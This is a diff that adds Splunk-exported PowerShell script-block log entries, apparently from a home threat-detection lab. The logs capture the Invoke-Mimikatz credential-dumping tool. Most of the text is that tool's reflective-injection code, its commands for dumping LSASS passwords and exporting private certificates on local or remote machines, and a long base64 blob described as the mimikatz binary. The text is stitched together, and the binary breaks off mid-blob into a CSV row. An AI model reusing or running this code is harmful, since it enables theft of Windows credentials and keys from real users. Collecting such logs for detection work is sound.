+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
+		}
+		
+		#Don't free a library if it is injected in a remote process
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
+		}
+		else
+		{
+			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
+			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
+			if ($Success -eq $false)
+			{
+				Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
+			}
+		}
+		
+		Write-Verbose ""Done!""
+	}
+
+	Main
+}
+
+#Main function to either run the script locally or remotely
+Function Main
+{
+	if (($PSCmdlet.MyInvocation.BoundParameters[""Debug""] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[""Debug""].IsPresent)
+	{
+		$DebugPreference  = ""Continue""
+	}
+	
+	Write-Verbose ""PowerShell ProcessID: $PID""
+	
+
+	if ($PsCmdlet.ParameterSetName -ieq ""DumpCreds"")
+	{
+		$ExeArgs = ""sekurlsa::logonpasswords exit""
+	}
+    elseif ($PsCmdlet.ParameterSetName -ieq ""DumpCerts"")
+    {
+        $ExeArgs = ""crypto::cng crypto::capi `""crypto::certificates /export`"" `""crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`"" exit""
+    }
+    else
+    {
+        $ExeArgs = $Command
+    }
+
+    [System.IO.Directory]::SetCurrentDirectory($pwd)
+
+    # mimikatz 2.2.0 (x64) #18362
+    # SHA256 hash: E4B762ECA32A797E305C9949504B95C4CDCF68FC8EEE0B3C101842488AF27D4F
+    # VirusTotal Analysis: no signature yet ;)
+    $PEBytes64 = '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
+d261f22f-3dc8-4dc6-914f-cd178abb26fe","2025-11-23T14:39:14.627+0000",,,Execute,,"DESKTOP-78CU07R","DESKTOP-78CU07R",,409,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",409,"mydfir-project",,127,,,,,,,"//_::._=--/===-==-------==--====___=__=________.__",,,,,,,,,,,,medium,3,,,4104,,,,,,,"Microsoft-Windows-PowerShell/Operational",WinEventLog,,"chalitha-splunk",,,,,,"track_event_signatures",,"track_event_signatures",,,,,,"Microsoft Windows",
+"$Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)","'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'",,,,,"DESKTOP-78CU07R","[System.Runtime.InteropServices.MarshalAsAttribute]",,DumpCreds,"$TypeBuilder.CreateType()",,,,"[AppDomain]","New-Object",4104,3,,,,"$TypeBuilder.CreateType()","$TypeBuilder.CreateType()",,,,,,,None,"Microsoft-Windows-PowerShell/Operational","$TypeBuilder.CreateType()","$TypeBuilder.CreateType()","$true",Splunk,"$AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)",,On,,,,,,,,,DumpCreds,0,,,,,,,,401,,,"{",,,,,"S-1-5-21-1697325460-2044954953-441488130-1001",0,"Microsoft-Windows-PowerShell","$TypeBuilder.CreateType()",,Execute,,Warning,"$ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])","NOT_TRANSLATED",,,,,,,,"New-Object","11/23/2025 08:39:14.627 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1697325460-2044954953-441488130-1001
+SidType=0
+SourceName=Microsoft-Windows-PowerShell
+Type=Warning
+RecordNumber=401
+Keywords=None
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+Message=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.
+
+FormatMessage error:
+
+Got the following information from this event: 
+
+function Invoke-Mimikatz
+{
+<#
+.SYNOPSIS
+
+This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
+dump credentials without ever writing the mimikatz binary to disk. 
+The script has a ComputerName parameter which allows it to be executed against multiple computers.
+
+This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
+
+Function: Invoke-Mimikatz
+Author: Joe Bialek, Twitter: @JosephBialek
+Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
+License:  http://creativecommons.org/licenses/by/3.0/fr/
+Required Dependencies: Mimikatz (included)
+Optional Dependencies: None
+Mimikatz version: 2.0 alpha (12/14/2015)
+
+.DESCRIPTION
+
+Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
+functionality provided with Mimikatz.
+
+.PARAMETER DumpCreds
+
+Switch: Use mimikatz to dump credentials out of LSASS.
+
+.PARAMETER DumpCerts
+
+Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).
+
+.PARAMETER Command
+
+Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz ""privilege::debug exit"" as an example.
+
+.PARAMETER ComputerName
+
+Optional, an array of computernames to run the script on.
+	
+.EXAMPLE
+
+Execute mimikatz on the local computer to dump certificates.
+Invoke-Mimikatz -DumpCerts
+
+.EXAMPLE
+
+Execute mimikatz on two remote computers to dump credentials.
+Invoke-Mimikatz -DumpCreds -ComputerName @(""computer1"", ""computer2"")
+
+.EXAMPLE
+
+Execute mimikatz on a remote computer with the custom command ""privilege::debug exit"" which simply requests debug privilege and exits
+Invoke-Mimikatz -Command ""privilege::debug exit"" -ComputerName ""computer1""
+
+.NOTES
+This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
+Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
+Find mimikatz at: http://blog.gentilkiwi.com
+
+.LINK
+
+http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
+#>
+
+[CmdletBinding(DefaultParameterSetName=""DumpCreds"")]
+Param(
+	[Parameter(Position = 0)]
+	[String[]]
+	$ComputerName,
+
+    [Parameter(ParameterSetName = ""DumpCreds"", Position = 1)]
+    [Switch]
+    $DumpCreds,
+
+    [Parameter(ParameterSetName = ""DumpCerts"", Position = 1)]
+    [Switch]
+    $DumpCerts,
+
+    [Parameter(ParameterSetName = ""CustomCommand"", Position = 1)]
+    [String]
+    $Command
+)
+
+Set-StrictMode -Version 2
+
+
+$RemoteScriptBlock = {
+	[CmdletBinding()]
+	Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[String]
+		$PEBytes64,
+
+        [Parameter(Position = 1, Mandatory = $true)]
+		[String]
+		$PEBytes32,
+		
+		[Parameter(Position = 2, Mandatory = $false)]
+		[String]
+		$FuncReturnType,
+				
+		[Parameter(Position = 3, Mandatory = $false)]
+		[Int32]
+		$ProcId,
+		
+		[Parameter(Position = 4, Mandatory = $false)]
+		[String]
+		$ProcName,
+
+        [Parameter(Position = 5, Mandatory = $false)]
+        [String]
+        $ExeArgs
+	)
+	
+	###################################
+	##########  Win32 Stuff  ##########
+	###################################
+	Function Get-Win32Types
+	{
+		$Win32Types = New-Object System.Object
+
+		#Define all the structures/enums that will be used
+		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
+		$Domain = [AppDomain]::CurrentDomain
+		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
+		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+
+
+		############    ENUM    ############
+		#Enum MachineType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
